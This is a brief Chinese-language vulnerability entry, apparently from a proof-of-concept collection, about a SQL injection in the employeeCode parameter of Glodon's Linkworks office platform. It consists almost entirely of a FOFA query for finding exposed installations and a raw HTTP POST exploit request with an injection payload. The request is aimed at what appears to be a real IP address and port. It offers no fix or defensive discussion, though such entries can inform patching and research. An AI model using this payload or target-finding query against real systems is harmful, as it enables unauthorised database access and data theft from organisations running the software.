# 广联达-Linkworks 协同办公管理平台 Service.asmx GetUserByEmployeeCode 文件 employeeCode 参数 SQL注入漏洞

    ## fofa

```
body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

```
POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
Host: 112.245.48.187:8188
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 39

employeeCode=1'-1/user--'&EncryptData=1
```
